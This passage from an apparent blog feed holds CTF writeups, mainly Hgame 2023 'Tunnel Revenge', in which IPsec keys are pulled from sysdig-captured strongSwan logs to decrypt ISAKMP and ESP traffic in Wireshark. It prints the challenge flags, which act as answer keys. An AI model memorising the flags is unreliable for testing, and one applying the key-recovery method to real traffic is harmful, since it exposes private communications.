FC B8 5F EE B1 1F D9 A1 62 8D  We.v...._.....b.</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]   48: 87 BB FF 75 A0 1A 96 35 42 80 63 99 95 D9 04 27  ...u...5B.c....&#x27;</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]   64: 23 FC 0D 58 A0                                   #..X.</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD] encryption initiator key =&gt; 16 bytes @ 0x7f86d0002750</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]    0: 86 1C 6A AC 7A C8 CC A9 FD 5A EC 0A 2C 14 0B 77  ..j.z....Z..,..w</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD] encryption responder key =&gt; 16 bytes @ 0x7f86d0002e20</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]    0: C2 A6 38 0A 10 4C 87 C1 99 93 14 0D A5 97 45 1F  ..8..L........E.</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD] integrity initiator key =&gt; 20 bytes @ 0x7f86d0002d20</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]    0: 20 31 7D CB 96 4A 34 CC 2F 95 52 BD 51 4A 93 EA   1&#125;..J4./.R.QJ..</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]   16: 17 F5 CE 68                                      ...h</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD] integrity responder key =&gt; 20 bytes @ 0x7f86d0002e40</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]    0: 37 D1 43 12 55 CC E7 A6 A5 3C 8E 1C 11 3C 3E C0  7.C.U....&lt;...&lt;&gt;.</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]   16: 45 00 72 87                                      E.r.</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD] adding inbound ESP SA</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]   SPI 0xcefea138, src 192.168.138.128 dst 192.168.138.132</span><br></pre></td></tr></table></figure>

<p><img src="https://i.imgur.com/iCzSUxz.png"></p>
<p>通过上述的这些信息,查阅资料阅读我们能知道其src ip –&gt; <code>192.168.138.128</code>,dst ip –&gt; <code>192.168.138.132</code>,Encryption –&gt; <code>AES_CBC</code>,Authentication  –&gt; <code>HMAC_SHA1_96</code>.<code>Encryption Key</code> –&gt; <code>C2A6380A104C87C19993140DA597451F</code>,Authentication Key –&gt; <code>37D1431255CCE7A6A53C8E1C113C3EC045007287</code></p>
<p>将其导入Wireshark 编辑-首选项-Protocols-ESP</p>
<p>勾选<code>Attempt to detect/ decode encrypted ESP payloads</code></p>
<p><img src="https://i.imgur.com/oc263xb.png"></p>
<p><img src="https://i.imgur.com/bHMysxr.png"></p>
<p>导入后可以看到这里已被解密</p>
<p><img src="https://i.imgur.com/5gD6RQ8.png"></p>
<p><img src="https://i.imgur.com/59U7cIJ.png"></p>
<p>拿到flag –&gt; <code>hgame&#123;ikev1_m4y_n0t_5af3_3kogsr9w5k&#125;</code></p>
<p>tips:关于<code>Encryption Key</code>和<code>Authentication Key</code>一般只有两种组合<code>861C6AAC7AC8CCA9FD5AEC0A2C140B77 20317DCB964A34CC2F9552BD514A93EA17F5CE68</code>和<code>C2A6380A104C87C19993140DA597451F 37D1431255CCE7A6A53C8E1C113C3EC045007287</code>二者尝试一下就知道应该选用哪个了</p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Misc</tag>
        <tag>CTF</tag>
        <tag>Forensics</tag>
        <tag>Sysdig</tag>
        <tag>ISAKMP Protocol</tag>
        <tag>ESP Protocol</tag>
      </tags>
  </entry>
  <entry>
    <title>Hgame 2023 week3 - Tunnel &amp;&amp; Tunnel Revenge Writeup(EN)</title>
    <url>/2023/01/31/Hgame-2023-week3-Tunnel-&amp;&amp;-Tunnel-Revenge-Writeup(EN)/</url>
    <content><![CDATA[<h1 id="Hgame-2023-week3-Tunnel-amp-amp-Tunnel-Revenge-Writeup-EN"><a href="#Hgame-2023-week3-Tunnel-amp-amp-Tunnel-Revenge-Writeup-EN" class="headerlink" title="Hgame 2023 week3 - Tunnel &amp;&amp; Tunnel Revenge Writeup(EN):"></a>Hgame 2023 week3 - Tunnel &amp;&amp; Tunnel Revenge Writeup(EN):</h1><p>There is nothing to do on the third day of the Lunar New Year. I basically finished worshiping and started normal work and study. Hgame 2023 week3 just started. There is a misc question. A friend told me that it is very interesting, so I will take a look. Then I successfully got the first blood. The following is the idea of solving the problem</p>
<h2 id="Tunnel"><a href="#Tunnel" class="headerlink" title="Tunnel:"></a>Tunnel:</h2><p>Unexpected pinch</p>
<p>Direct strings | grep hgame will come out</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crazyman@ubuntu:~/Desktop$ strings tunnel.pcapng | grep hgame</span><br><span class="line">hgame&#123;ikev1_may_not_safe_aw987rtgh&#125;</span><br><span class="line">hgame&#123;ikev1_may_not_safe_aw987rtgh&#125;</span><br><span class="line">hgame&#123;ikev1_may_not_safe_aw987rtgh&#125;</span><br><span class="line">hgame&#123;ikev1_may_not_safe_aw987rtgh&#125;</span><br></pre></td></tr></table></figure>

<p>flag–&gt; <code>hgame&#123;ikev1_may_not_safe_aw987rtgh&#125;</code></p>
<h2 id="Tunnel-Revenge："><a href="#Tunnel-Revenge：" class="headerlink" title="Tunnel Revenge："></a>Tunnel Revenge：</h2><p>Revenge version fixed for unexpected strings</p>
<h3 id="TFTP"><a href="#TFTP" class="headerlink" title="TFTP:"></a>TFTP:</h3><p>First open traffic we can observe that there is a large amount of TFTP</p>
<p><img src="https://i.imgur.com/WZHGjvM.png"></p>
<p>Related TFTP content can be extracted by exporting objects</p>
<p><img src="https://i.imgur.com/4OpwnUg.png"></p>
<p><img src="https://i.imgur.com/YfAeWky.png"></p>
<p>Extracted the charon.scap file, then opened the scap file with wireshark and found that it was a sysdig Event</p>
<p><img src="https://i.imgur.com/XQenZtr.png"></p>
<h3 id="sysdig"><a href="#sysdig" class="headerlink" title="sysdig:"></a>sysdig:</h3><p>If you see sysdig, if you have a lot of questions, you can think of a question about bytectf last year –&gt; <code>find_it</code>.</p>
<p><a href="https://bytedance.feishu.cn/docx/doxcnWmtkIItrGokckfo1puBtCh">https://bytedance.feishu.cn/docx/doxcnWmtkIItrGokckfo1puBtCh</a></p>
<p>You can refer to writeup, and then install sysdig</p>
<p><a href="https://github.com/annulen/sysdig-wiki/blob/master/How-to-Install-Sysdig-for-Linux.md">https://github.com/annulen/sysdig-wiki/blob/master/How-to-Install-Sysdig-for-Linux.md</a></p>
<p>You can refer to the above link</p>
<p>The method I use:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -s https://s3.amazonaws.com/download.draios.com/DRAIOS-GPG-KEY.public | sudo apt-key add -  </span><br><span class="line">curl -s -o /etc/apt/sources.list.d/draios.list http://download.draios.com/stable/deb/draios.list  </span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get -y install linux-headers-$(uname -r)</span><br><span class="line">sudo apt-get -y install sysdig</span><br></pre></td></tr></table></figure>

<p>After the installation is successful, we can cooperate with <code>chisels</code> for analysis</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crazyman@ubuntu:~/Desktop$ sudo sysdig -cl</span><br><span class="line"></span><br><span class="line">Category: Application</span><br><span class="line">---------------------</span><br><span class="line">httplog         HTTP requests log</span><br><span class="line">httptop         Top HTTP requests</span><br><span class="line">memcachelog     memcached requests log</span><br><span class="line"></span><br><span class="line">Category: CPU Usage</span><br><span class="line">-------------------</span><br><span class="line">spectrogram     Visualize OS latency in real time.</span><br><span class="line">subsecoffset    Visualize subsecond offset execution time.</span><br><span class="line">topcontainers_cpu</span><br><span class="line">                Top containers by CPU usage</span><br><span class="line">topprocs_cpu    Top processes by CPU usage</span><br><span class="line"></span><br><span class="line">Category: Errors</span><br><span class="line">----------------</span><br><span class="line">topcontainers_error</span><br><span class="line">                Top containers by number of errors</span><br><span class="line">topfiles_errors Top files by number of errors</span><br><span class="line">topprocs_errors top processes by number of errors</span><br><span class="line"></span><br><span class="line">Category: I/O</span><br><span class="line">-------------</span><br><span class="line">echo_fds        Print the data read and written by processes.</span><br><span class="line">fdbytes_by      I/O bytes, aggregated by an arbitrary filter field</span><br><span class="line">fdcount_by      FD count, aggregated by an arbitrary filter field</span><br><span class="line">fdtime_by       FD time group by</span><br><span class="line">iobytes         Sum of I/O bytes on any type of FD</span><br><span class="line">iobytes_file    Sum of file I/O bytes</span><br><span class="line">spy_file        Echo any read/write made by any process to all files. Optionall</span><br><span class="line">                y, you can provide the name of one file to only intercept reads</span><br><span class="line">                /writes to that file.</span><br><span class="line">stderr          Print stderr of processes</span><br><span class="line">stdin           Print stdin of processes</span><br><span class="line">stdout          Print stdout of processes</span><br><span class="line">topcontainers_file</span><br><span class="line">                Top containers by R+W disk bytes</span><br><span class="line">topfiles_bytes  Top files by R+W bytes</span><br><span class="line">topfiles_time   Top files by time</span><br><span class="line">topprocs_file   Top processes by R+W disk bytes</span><br><span class="line">udp_extract     extract data from UDP streams to files.</span><br><span class="line"></span><br><span class="line">Category: Logs</span><br><span class="line">--------------</span><br><span class="line">spy_logs        Echo any write made by any process to a log file. Optionally, e</span><br><span class="line">                xport the events around each log message to file.</span><br><span class="line">spy_syslog      Print every message written to syslog. Optionally, export the e</span><br><span class="line">                vents around each syslog message to file.</span><br><span class="line"></span><br><span class="line">Category: Misc</span><br><span class="line">--------------</span><br><span class="line">around          Export to file the events around the time range where the given</span><br><span class="line">                 filter matches.</span><br><span class="line"></span><br><span class="line">Category: Net</span><br><span class="line">-------------</span><br><span class="line">iobytes_net     Show total network I/O bytes</span><br><span class="line">spy_ip          Show the data exchanged with the given IP address</span><br><span class="line">spy_port        Show the data exchanged using the given IP port number</span><br><span class="line">topconns        Top network connections by total bytes</span><br><span class="line">topcontainers_net</span><br><span class="line">                Top containers by network I/O</span><br><span class="line">topports_server Top TCP/UDP server ports by R+W bytes</span><br><span class="line">topprocs_net    Top processes by network I/O</span><br><span class="line"></span><br><span class="line">Category: Performance</span><br><span class="line">---------------------</span><br><span class="line">bottlenecks     Slowest system calls</span><br><span class="line">fileslower      Trace slow file I/O</span><br><span class="line">netlower        Trace slow network I/0</span><br><span class="line">proc_exec_time  Show process execution time</span><br><span class="line">scallslower     Trace slow syscalls</span><br><span class="line">topscalls       Top system calls by number of calls</span><br><span class="line">topscalls_time  Top system calls by time</span><br><span class="line"></span><br><span class="line">Category: Security</span><br><span class="line">------------------</span><br><span class="line">list_login_shells</span><br><span class="line">                List the login shell IDs</span><br><span class="line">shellshock_detect</span><br><span class="line">                print shellshock attacks</span><br><span class="line">spy_users       Display interactive user activity</span><br><span class="line"></span><br><span class="line">Category: System State</span><br><span class="line">----------------------</span><br><span class="line">lscontainers    List the running containers</span><br><span class="line">lsof            List (and optionally filter) the open file descriptors.</span><br><span class="line">netstat         List (and optionally filter) network connections.</span><br><span class="line">ps              List (and optionally filter) the machine processes.</span><br><span class="line"></span><br><span class="line">Category: Tracers</span><br><span class="line">-----------------</span><br><span class="line">tracers_2_statsd</span><br><span class="line">                Export spans duration as statds metrics.</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>You can get <code>echo_fds</code> first to see what is there</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo sysdig -r charon.scap -A -c echo_fds</span><br></pre></td></tr></table></figure>

<p>Output can be saved to a file for further analysis</p>
<p>First, we can find some command line history <code>/root/.zsh_history</code></p>
<p><img src="https://i.imgur.com/D3pRbww.png"></p>
<p>The first and second parts are the installation of some environments and the installation of sysdig</p>
<p>You can search for the file name to locate some key places</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[31m------ Read 1.30KB from  [31m /root/.zsh_history (zsh)</span><br><span class="line"></span><br><span class="line">y_logs -w 233.scap</span><br><span class="line">: 1674489646:0;systemctl start ipsec</span><br><span class="line">: 1674489657:0;systemctl stop ipsec</span><br><span class="line">: 1674489659:0;nano /etc/ipsec.conf</span><br><span class="line">: 1674489672:0;sysdig -C 100 -W 1 -c spy_logs -w 233.scap</span><br><span class="line">: 1674489696:0;systemctl start ipsec</span><br><span class="line">: 1674489725:0;systemctl stop ipsec</span><br><span class="line">: 1674489793:0;sysdig -C 100 -W 1 -c spy_logs -w 233.scap</span><br><span class="line">: 1674489796:0;systemctl start ipsec</span><br><span class="line">: 1674489814:0;nc -ulvvp 3939</span><br><span class="line">: 1674489894:0;nano /etc/ipsec.conf</span><br><span class="line">: 1674489968:0;systemctl restart ipsec</span><br><span class="line">: 1674489972:0;nc -ulvvp 3939</span><br><span class="line">: 1674490131:0;sysdig -C 100 -W 1 -c spy_logs -w 233.scap</span><br><span class="line">: 1674490142:0;systemctl stop ipsec</span><br><span class="line">: 1674490155:0;sysdig -C 100 -W 1 -c spy_logs -w 233.scap</span><br><span class="line">: 1674490160:0;systemctl start ipsec</span><br><span class="line">: 1674490234:0;mv 233.scap0 ipsec.scap</span><br><span class="line">: 1674490246:0;mv ipsec.scap charon.scap</span><br><span class="line">: 1674490254:0;atftp 192.168.138.128</span><br><span class="line">: 1674490293:0;ip xfrm stat</span><br><span class="line">: 1674490298:0;systemctl stop ipsec</span><br><span class="line">: 1674490456:0;md5sum charon.scap</span><br><span class="line">: 1674490459:0;md5sum charon_asd.scap</span><br><span class="line">: 1674490505:0;sysdig -r charon_asd.scap -c spy_logs &gt; a.txt</span><br><span class="line">: 1674492979:0;ifconfig</span><br><span class="line">: 1674492985:0;ifconfig enp2s1 up</span><br><span class="line">: 1674492988:0;dhclient</span><br><span class="line">: 1674492990:0;ifconfig</span><br><span class="line">: 1674493027:0;systemctl stop ipsec</span><br><span class="line">: 1674493029:0;nano /etc/ipsec.conf</span><br><span class="line">: 1674493072:0;systemctl start ipsec</span><br><span class="line">: 1674493232:0;nc -ulvvp 3939</span><br><span class="line">: 1674493542:0;systemctl stop ipsec</span><br><span class="line">: 1674493562:0;sysdig -C 100 -W 1 -c spy_logs -w 233.scap</span><br></pre></td></tr></table></figure>

<p>Some key information <code>sysdig -r charon_asd.scap -c spy_logs</code>,<code>nc -ulvvp 3939</code>,<code>nano /etc/ipsec.conf</code></p>
<p>Then we can know that the accepted port is 3939 and then we can use sysdig’s spy_logs to extract data, there is also a file ipsec.conf, let’s search for this file first</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[31m------ Read 847B from  [31m /etc/ipsec.conf (starter)</span><br><span class="line"></span><br><span class="line"># ipsec.conf - strongSwan IPsec configuration file</span><br><span class="line"></span><br><span class="line"># basic configuration</span><br><span class="line"></span><br><span class="line">config setup</span><br><span class="line"># strictcrlpolicy=yes</span><br><span class="line"># uniqueids = no</span><br><span class="line"></span><br><span class="line"># Add connections here.</span><br><span class="line"></span><br><span class="line"># Sample VPN connections</span><br><span class="line"></span><br><span class="line">#conn sample-self-signed</span><br><span class="line">#      leftsubnet=10.1.0.0/16</span><br><span class="line">#      leftcert=selfCert.der</span><br><span class="line">#      leftsendcert=never</span><br><span class="line">#      right=192.168.0.2</span><br><span class="line">#      rightsubnet=10.2.0.0/16</span><br><span class="line">#      rightcert=peerCert.der</span><br><span class="line">#      auto=start</span><br><span class="line"></span><br><span class="line">#conn sample-with-ca-cert</span><br><span class="line">#      leftsubnet=10.1.0.0/16</span><br><span class="line">#      leftcert=myCert.pem</span><br><span class="line">#      right=192.168.0.2</span><br><span class="line">#      rightsubnet=10.2.0.0/16</span><br><span class="line">#      rightid=&quot;C=CH, O=Linux strongSwan CN=peer name&quot;</span><br><span class="line">#      auto=start</span><br><span class="line">conn test</span><br><span class="line">    authby=secret</span><br><span class="line">    auto=start</span><br><span class="line">    keyexchange=ikev1</span><br><span class="line">    ike=aes128-sha1-modp1024!</span><br><span class="line">    esp=aes128-sha1!</span><br><span class="line">    left=192.168.138.132</span><br><span class="line">    right=192.168.138.128</span><br><span class="line">    type=transport</span><br><span class="line">    leftprotoport=17/3939</span><br><span class="line">    rightprotoport=17/3939</span><br></pre></td></tr></table></figure>

<p>You can see that the last part is:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conn test</span><br><span class="line">    authby=secret</span><br><span class="line">    auto=start</span><br><span class="line">    keyexchange=ikev1</span><br><span class="line">    ike=aes128-sha1-modp1024!</span><br><span class="line">    esp=aes128-sha1!</span><br><span class="line">    left=192.168.138.132</span><br><span class="line">    right=192.168.138.128</span><br><span class="line">    type=transport</span><br><span class="line">    leftprotoport=17/3939</span><br><span class="line">    rightprotoport=17/3939</span><br></pre></td></tr></table></figure>

<p>At the same time we can extract <code>spy_logs</code> with the command</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sysdig -r charon.scap -c spy_logs</span><br></pre></td></tr></table></figure>

<p>Save it to a file for analysis</p>
<p>Then we can see <code>keyexchange=ikev1</code> and the <code>ISAKMP</code> and <code>ESP</code> protocols in the traffic packet. After searching, we can find this article</p>
<p><a href="https://celaldogan2010.medium.com/decrypting-ipsec-protocols-isakmp-and-esp-with-wireshark-d484a5a93991">https://celaldogan2010.medium.com/decrypting-ipsec-protocols-isakmp-and-esp-with-wireshark-d484a5a93991</a></p>
<p><img src="https://i.imgur.com/o8b2MgN.png"></p>
<p>By reading the blog post, I found that it is fully in line with all the situations we know so far. It mainly uses the IPSec protocol (specifically, it is implemented by Strongswan). <code>/etc/ipsec.conf</code> is the relevant configuration of Strongswan. Through its Configuration We can also find <code>/etc/strongswan.conf</code>, but we can’t find <code>charon.log</code> and <code>/etc/ipsec.secrets</code></p>
<p><code>/etc/strongswan.conf</code> content:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[31m------ Read 369B from  [31m /etc/strongswan.conf (starter)</span><br><span class="line"></span><br><span class="line"># strongswan.conf - strongSwan configuration file</span><br><span class="line">#</span><br><span class="line"># Refer to the strongswan.conf(5) manpage for details</span><br><span class="line">#</span><br><span class="line"># Configuration changes should be made in the included files</span><br><span class="line"></span><br><span class="line">charon &#123;</span><br><span class="line">load_modular = yes</span><br><span class="line">syslog &#123;</span><br><span class="line">identifier = charon</span><br><span class="line">default = 4</span><br><span class="line">auth &#123;</span><br><span class="line">default = 4</span><br><span class="line">ike = 4</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">plugins &#123;</span><br><span class="line">include strongswan.d/charon/*.conf</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>However, it is not so useful, it is only used to connect the path of the topic</p>
<p>Since IPSec is composed of ISAKMP and ESP, we first decrypt the <code>ISAKMP</code> part</p>
<h3 id="ISAKMP"><a href="#ISAKMP" class="headerlink" title="ISAKMP:"></a>ISAKMP:</h3><p>Through <code>Step 4 Acquiring ICOOKIE (Initiator SPI) and the encryption key from log file (charon.log) for ISAKMP</code> of this article, we first decrypt <code>ISAKMP</code></p>
<p>Search <code>checkout</code> in <code>echo_fds</code> and get Initiator’s COOKIE –&gt; <code>620270aca82ca7ad</code></p>
<p><img src="https://i.imgur.com/Qi7VSLU.png"></p>
<p>Search <code>encryption key</code> in <code>spy_logs</code> to get Encryption key –&gt; <code>99EF15AC696A5CC9442E8A8A54038674</code></p>
<p><img src="https://i.imgur.com/GnuLoy1.png"></p>
<p>Then import wireshark, edit-preferences-Protocols-ISAKMP-IKEv1 Decryption Table</p>
<p><img src="https://i.imgur.com/4YYJyti.png"></p>
<p>Fill in the Initiator’s COOKIE and Encryption key mentioned above</p>
<p><img src="https://i.imgur.com/o1kloZq.png"></p>
<p>Before importing:</p>
<p><img src="https://i.imgur.com/AABV8x5.png"></p>
<p>After importing:</p>
<p><img src="https://i.imgur.com/Gqohqiv.png"></p>
<p>It can be found that it has been successfully parsed</p>
<p>However, there is still no flag, and we found that we have not decrypted <code>ESP</code>, so we need to decrypt <code>ESP</code> for subsequent steps</p>
<p><img src="https://i.imgur.com/pH2YikC.png"></p>
<h3 id="ESP"><a href="#ESP" class="headerlink" title="ESP:"></a>ESP:</h3><p>Through the <code>Step 5 Acquiring authentication, encryption keys and algorithms for ESP</code> of the article, we know that if we need to decrypt the <code>ESP</code> protocol, we need to find <code>SPI</code>, <code>authentication and encryption keys</code> and its encryption verification method</p>
<p>SPI can pass traffic to get it’s <code>0xcefea138</code></p>
<p><img src="https://i.imgur.com/gL2pXd9.png"></p>
<p>Search <code>0xcefea138</code> in <code>spy_logs</code> to locate the relevant log:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CFG] received proposals: ESP:AES_CBC_128/HMAC_SHA1_96/NO_EXT_SEQ</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CFG] configured proposals: ESP:AES_CBC_128/HMAC_SHA1_96/NO_EXT_SEQ</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CFG] selected proposal: ESP:AES_CBC_128/HMAC_SHA1_96/NO_EXT_SEQ</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD] CHILD_SA test&#123;1&#125; state change: CREATED =&gt; INSTALLING</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]   using AES_CBC for encryption</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]   using HMAC_SHA1_96 for integrity</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD] initiator SA seed =&gt; 69 bytes @ 0x7f86fe2faa20</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]    0: 03 47 74 5E 89 A4 B4 A2 68 5F A7 9A B2 56 8D 43  .Gt^....h_...V.C</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]   16: AA 70 32 8A D1 B5 E2 26 C0 63 7A C7 B4 B6 BC DD  .p2....&amp;.cz.....</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]   32: 57 65 07 76 08 9E FC B8 5F EE B1 1F D9 A1 62 8D  We.v...._.....b.</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]   48: 87 BB FF 75 A0 1A 96 35 42 80 63 99 95 D9 04 27  ...u...5B.c....&#x27;</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]   64: 23 FC 0D 58 A0                                   #..X.</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD] responder SA seed =&gt; 69 bytes @ 0x7f86fe2fa9d0</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]    0: 03 CE FE A1 38 A4 B4 A2 68 5F A7 9A B2 56 8D 43  ....8...h_...V.C</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]   16: AA 70 32 8A D1 B5 E2 26 C0 63 7A C7 B4 B6 BC DD  .p2....&amp;.cz.....</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]   32: 57 65 07 76 08 9E FC B8 5F EE B1 1F D9 A1 62 8D  We.v...._.....b.</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]   48: 87 BB FF 75 A0 1A 96 35 42 80 63 99 95 D9 04 27  ...u...5B.c....&#x27;</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]   64: 23 FC 0D 58 A0                                   #..X.</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD] encryption initiator key =&gt; 16 bytes @ 0x7f86d0002750</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]    0: 86 1C 6A AC 7A C8 CC A9 FD 5A EC 0A 2C 14 0B 77  ..j.z....Z..,..w</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD] encryption responder key =&gt; 16 bytes @ 0x7f86d0002e20</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]    0: C2 A6 38 0A 10 4C 87 C1 99 93 14 0D A5 97 45 1F  ..8..L........E.</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD] integrity initiator key =&gt; 20 bytes @ 0x7f86d0002d20</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]    0: 20 31 7D CB 96 4A 34 CC 2F 95 52 BD 51 4A 93 EA   1&#125;..J4./.R.QJ..</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]   16: 17 F5 CE 68                                      ...h</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD] integrity responder key =&gt; 20 bytes @ 0x7f86d0002e40</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]    0: 37 D1 43 12 55 CC E7 A6 A5 3C 8E 1C 11 3C 3E C0  7.C.U....&lt;...&lt;&gt;.</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]   16: 45 00 72 87                                      E.r.</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD] adding inbound ESP SA</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]   SPI 0xcefea138, src 192.168.138.128 dst 192.168.138.132</span><br></pre></td></tr></table></figure>

<p><img src="https://i.imgur.com/iCzSUxz.png"></p>
<p>Through the above information, we can know the src ip –&gt; <code>192.168.138.128</code>,dst ip –&gt; <code>192.168.138.132</code>,Encryption –&gt; <code>AES_CBC</code>,Authentication  –&gt; <code>HMAC_SHA1_96</code>.<code>Encryption Key</code> –&gt; <code>C2A6380A104C87C19993140DA597451F</code>,Authentication Key –&gt; <code>37D1431255CCE7A6A53C8E1C113C3EC045007287</code></p>
<p>Import it into Wireshark Edit-Preferences-Protocols-ESP</p>
<p>tick<code>Attempt to detect/ decode encrypted ESP payloads</code></p>
<p><img src="https://i.imgur.com/oc263xb.png"></p>
<p><img src="https://i.imgur.com/bHMysxr.png"></p>
<p>After importing, you can see that it has been decrypted</p>
<p><img src="https://i.imgur.com/5gD6RQ8.png"></p>
<p><img src="https://i.imgur.com/59U7cIJ.png"></p>
<p>get the flag –&gt; <code>hgame&#123;ikev1_m4y_n0t_5af3_3kogsr9w5k&#125;</code></p>
<p>tips: Generally only two combinations between <code>Encryption Key</code> and <code>Authentication Key</code>–&gt;<code>861C6AAC7AC8CCA9FD5AEC0A2C140B77 20317DCB964A34CC2F9552BD514A93EA17F5CE68</code>and <code>C2A6380A104C87C19993140DA597451F 37D1431255CCE7A6A53C8E1C113C3EC045007287</code>Try both and you’ll know which one to choose.</p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Misc</tag>
        <tag>CTF</tag>
        <tag>Forensics</tag>
        <tag>Sysdig</tag>
        <tag>ISAKMP Protocol</tag>
        <tag>ESP Protocol</tag>
      </tags>
  </entry>
  <entry>
    <title>ASIS CTF 2021 Misc Writeup</title>
    <url>/2021/10/26/ASIS-CTF-2021-Misc-Writeup/</url>
    <content><![CDATA[<h1 id="ASIS-CTF-2021-Misc-Writeup"><a href="#ASIS-CTF-2021-Misc-Writeup" class="headerlink" title="ASIS CTF 2021 Misc Writeup"></a>ASIS CTF 2021 Misc Writeup</h1><h2 id="challenge-Factory"><a href="#challenge-Factory" class="headerlink" title="challenge-Factory:"></a>challenge-Factory:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In the simplest terms, factory misco-graphy is the ratio of output to input!</span><br></pre></td></tr></table></figure>

<p>It is an easy stego challenge.Use foremost to solve it</p>
<p><img src="https://i.imgur.com/UcOiIoI.png"></p>
<p>flag:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ASIS&#123;PDF_1N_PDF_iZ_A_T4sK_fOR_fOreEnSic5_L0v3RS&#125;</span><br></pre></td></tr></table></figure>

<h2 id="challenge-Gesture"><a href="#challenge-Gesture" class="headerlink" title="challenge-Gesture:"></a>challenge-Gesture:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A gesture is a file that is intended to indicate or emphasize something!</span><br><span class="line"></span><br><span class="line">Note: flag is lowercase string, put the flag in ASIS&#123;flag&#125; too.</span><br></pre></td></tr></table></figure>

<p>It is an interesting challenge.I can’t solve it in game.This is the recurrence work after the game</p>
<p>first use <code>file</code> and <code>binwalk</code> to check out this file</p>
<p>file:</p>
<p><img src="https://i.imgur.com/rTvwmaB.png"></p>
<p>binwalk:</p>
<p><img src="https://i.imgur.com/6ETdj8U.png"></p>
<p>wow you can find it is <code>YAFFS</code> filesystem,It is a key to extract this img file</p>
<p>use <a href="https://github.com/justsoso8/yaffs2utils">https://github.com/justsoso8/yaffs2utils</a> to extract it</p>
<p>such as ./unyaffs2</p>
<p>command:</p>
